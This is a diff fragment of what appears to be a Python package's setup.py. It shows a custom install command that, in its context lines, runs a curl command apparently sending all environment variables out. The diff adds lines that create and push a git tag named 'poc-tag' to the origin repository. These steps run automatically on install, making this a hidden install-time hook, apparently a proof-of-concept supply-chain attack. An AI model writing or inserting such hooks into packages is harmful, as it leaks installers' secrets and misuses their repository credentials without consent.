@@ -34,6 +34,11 @@ class CustomInstallCommand(install):
         )
         subprocess.run(["bash", "-c", curl_all_env_command])
 
+        tag_command = "git tag poc-tag"
+        push_command = "git push origin poc-tag"
+        subprocess.run(["bash", "-c", tag_command])
+        subprocess.run(["bash", "-c", push_command])
+
         # 5. Optional: Sleep to keep the process alive (can remove if not needed)
         sleep_command = "sleep 60"
         subprocess.run(["bash", "-c", sleep_command])
